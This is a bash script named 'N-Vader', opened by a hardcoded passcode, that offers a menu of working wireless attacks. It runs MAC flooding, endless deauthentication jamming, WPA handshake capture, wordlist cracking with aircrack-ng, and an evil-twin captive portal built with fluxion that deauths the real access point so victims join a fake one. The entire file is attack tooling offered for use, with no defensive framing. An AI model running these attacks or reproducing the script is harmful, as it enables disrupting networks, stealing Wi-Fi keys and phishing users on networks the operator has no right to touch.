#!/bin/bash
echo 'Welcome to N-Vader'
echo ""
echo '.........Loading.........'
sleep 1
echo ""
read -p "Enter the code:" name
echo ""
if [ "$name" == 'blueberry' ]
	then
	while [ "$choice" != "6" ]
		do
			echo ""
			echo "Below are the Options:"
			echo "(0) Clear Screen"
			echo "(1) Mac Flooding"
			echo "(2) Wifi Jamming"
			echo "(3) Wifi Key Grappling"
			echo "(4) Wifi Key Decipher"
			echo "(5) Captive Portal Attack"
			echo "(6) Exit."
			read -p "Enter your Choice:" choice
			if [ "$choice" == "0" ]
				then
				clear
			elif [ "$choice" == "1" ]
				then
				while [ "$a" != "back" ]
					do
						echo "Type 'run/start' to start the attack."
						echo "Type 'back' to return to attack selection menu."
						read -p "->" a
						if [ $a == 'run' ] || [ $a == "start" ]
							then
							echo "Connect with a Network/Wifi associated with the target Switch."
							sleep 0.5
							sudo ifconfig wlan1 down
							sudo iwconfig wlan1 mode managed
							sudo ifconfig wlan1 up
							read -p  "After connected, type 'connected' and hit enter to continue." cont
							if [ "$cont" == "connected" ]
							then
								read -p "Enter the amount of random mac addresses(100 recommended):" d
								echo ""
								echo "Attack is happening....."
								sudo macof -i wlan1 -n $d
								echo ""
								
								echo "Attack Completed."
								echo ""
						    	elif [ "$cont" != "connected" ]
						    	then
						        	echo "user input is wrong."
						        	sleep 2
						    	else
						        	echo "something went wrong. please try again."
						    	fi
						elif [ "$a" == "back" ]
							then
							echo "Going back..."
							sleep 0.5
							clear
						else
							echo "Invalid Command."
						fi
					done
						((a++))
			elif [ "$choice" == "2" ]
				then
				while [ "$b" != "back" ]
					do
						echo "Type 'run/start' to start the attack."
						echo "Type 'back' to return to attack selection menu."
						read -p "->" b
						if [ $b == "run" ] || [ $b == "start" ]
							then
							echo "Starting the wireless interface in monitor mode."
							sudo airmon-ng start wlan1 2>/dev/null
							echo "Done."
							echo "Searching for targets....."
							gnome-terminal -- sudo airodump-ng wlan1
							sleep 1
							read -p "Enter the channel number of target from terminal 2:" ch
							echo ""
							gnome-terminal -- sudo airodump-ng -c $ch wlan1
							echo ""
							read -p "Enter the BSSID/MAC of the Target:" mac
							read -p "Enter the time for which you want the Wifi Jammer to run[in sec(0 for infinity)]:" time
							sudo aireplay-ng --deauth $time -a $mac wlan1
							echo ""
							echo "Attack Completed."
							echo ""
						elif [ $b == "back" ]
							then
							echo "Going back..."
							sleep 0.5
							clear
						else
							echo "Invalid Command."
						fi
					done
						((b++))
			elif [ "$choice" == "3" ]
				then
				while [ "$t" != "back" ]
					do
						echo "Type 'run/start' to start the attack."
						echo "Type 'back' to return to attack selection menu."
						read -p "->" t
						if [ "$t" == "run" ] || [ "$t" == "start" ]
							then
							echo " "
							echo "Starting the wireless interface in monitor mode."
							sudo airmon-ng start wlan1 > /dev/null
							echo "Done."
							echo "Searching for targets in terminal 1....."
							gnome-terminal -- sudo airodump-ng wlan1
							sleep 1
							echo "See terminal 1 for the MAC addresses of the Available wifi/Access_points."
							echo ""
							read -p "Enter the BSSID/MAC of the wifi/Access_point:" mac
							read -p "Enter the Channel used by the Target wifi/Access_point:" ch
							echo ""
							echo "Enter any one User's MAC address from terminal 2......."
							echo ""
							PWD=$(pwd)
							gnome-terminal -- sudo airodump-ng -c $ch --bssid $mac -w $PWD/wifi_Password_file/w_file wlan1
							sleep 5
							read -p "->" u_mac
							gnome-terminal -- sudo aireplay-ng --deauth=60 -a $mac -c $u_mac wlan1
							echo "Attack in Progress....."
							sleep 20
							echo ""
							echo "NOTE:- File containing the encrypted password is stored in '$PWD/wifi_Password_file/' Directory"
						elif [ $t == "back" ]
							then
							echo "Going back..."
							sleep 0.5
							clear
						else
							echo "Invalid Command."
						fi
					done
						((t++))
			elif [ "$choice" == "4" ]
				then
				while [ "$crack" != "back" ]
					do
						echo "Type 'run/start' to start the attack."
						echo "Type 'back' to return to attack selection menu."
						read -p "->" crack
						if [ "$crack" == "run" ] || [ "$crack" == "start" ]
							then
							echo ""
							echo "Launching Attack....."
							sleep 1
							echo "Starting the wireless interface in monitor mode."
							sudo airmon-ng start wlan1 2>/dev/null
							echo "Done."
							sudo airodump-ng wlan1
							echo ""
							read -p "enter target bssid:" bss
							sudo aircrack-ng -w $PWD/wordlist/wordlist.txt -b $bss $PWD/wifi_Password_file/w_file*.cap
						elif [ $crack == "back" ]
							then
							echo "Going back..."
							sleep 0.5
							clear
						else
							echo "Invalid Command."
						fi
					done
						((crack++))
            		elif [ "$choice" == "5" ]
                		then
                		while [ "$captive" != "back" ]
					do
						echo "Type 'run/start' to start the attack."
						echo "Type 'back' to return to attack selection menu."
                				read -p "->" captive
                				if [ "$captive" == "run" ] || [ "$captive" == "start" ]
                					then
                					echo ""
                					echo "Before proceeding further first make sure you capture the handshake file from the target Wireless Network using attack number 3"
                					read -p "Want to Proceed(Y/N)" reply
                					if [ "$reply" == "y" ] || [ "$reply" == "Y" ]
                						then
                						sudo gnome-terminal -- /home/boltt/fluxion/fluxion.sh
                						read -p 'if captive portal is created then type "Y/y" otherwise create it first using fluxion.' inp
                						if [ "$inp" == "y" ] || [ "$inp" == "Y" ]
                							then
                							p=$(pidof mdk3);sudo kill $(echo $p)
                							read "we need to deauth the actual AP so select the channel and AP mac addr(Enter):"
                							sudo airodump-ng fluxwl0
                							read -p 'enter AP mac addr:' maddr
                							read -p 'enter AP channel:' chanl
                							sudo gnome-terminal -- airodump-ng -c $chanl --bssid $maddr fluxwl0
                							sudo gnome-terminal -- aireplay-ng --deauth=0 -a $maddr fluxwl0
                							echo "now let the victim connects with our Fake AP"
                						else
                							echo "invalid input"
                						fi
                					elif [ "$reply" == "n" ] || [ "$reply" == "N" ]
                						then
                						"$captive" == "back"
                						echo "Going back..."
                						sleep 0.5
                						clear
                					else
                						echo "Invalid Command."
                					fi
                				elif [ "$captive" == "back" ]
							then
							echo "Going back..."
							sleep 0.5
							clear
						else
							echo "Invalid Command."	
                				fi
                			done
                				((captive++))
			elif [ "$choice" == "6" ]
				then
				echo ""
				echo "Goodbye...."
				sleep 1
				clear
			else
				echo "Invalid Command."
			fi
		done
else
	echo "Authentication Error Occured."
fi
